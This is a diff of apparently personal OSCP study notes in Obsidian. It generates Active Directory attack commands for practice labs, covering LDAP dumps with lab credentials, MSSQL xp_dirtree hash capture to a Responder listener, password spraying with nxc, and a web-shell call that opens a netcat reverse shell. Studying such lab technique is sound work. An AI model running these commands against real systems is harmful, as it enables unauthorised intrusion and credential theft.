@@ -1,3 +1,14 @@
+## Time Sync
+
+Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues./
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `sudo ntpdate -s ${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 ## Discovering Domain Name
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -67,7 +78,6 @@ const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Us
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-
 ## looking for Users : looksupid --rid-brute
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -133,15 +143,34 @@ curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd
 Check for value files like lsass.zip
 
 ---
-## Port 1433 MSSQL Database
+## Port 389 : LDAP
+[[389 LDAP]]
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
+const command = `ldapsearch -H ldap://${ip} -x -s base namingcontexts`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally
+
+Then try LDAP dump. There might be password and username
+
+Try adding in user and password for a further search
+
+```
+ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
+```
+
+---
+## Port 1433 : MSSQL Database
 ### Get Net-NTLMv2
 
 Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener
 
 Open Listener
 ```
-sudo responder -I tun0
+sudo responder -I tun0 -dwv
 ```
 
 In MSSQL database query
@@ -152,6 +181,14 @@ const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+---
+## Port 1433 : MSSQL Database
+
+Run single commands
+```
+\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
+```
+
 ---
 ## Port 5985 : Evil-WinRM
 
@@ -214,7 +251,7 @@ Sometimes the svc account guy has a personal account as well which he reuses the
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -p '[password] --continue-on-success'`;
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -p '[password]'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -282,38 +319,6 @@ const command = `sudo nmap -sV -sC -sU -vvv ${ip} --script vuln`;
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 
----
-## Time Sync
-
-Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues.
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `sudo rdate -s ${ip}`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
----
-
-## LDAP 389
-[[389 LDAP]]
-
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `ldapsearch -H ldap://${ip} -x -s base namingcontexts`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally
-
-Then try LDAP dump. There might be password and username
-
-Try adding in user and password for a further search
-
-```
-ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
-```
 
 ---
 
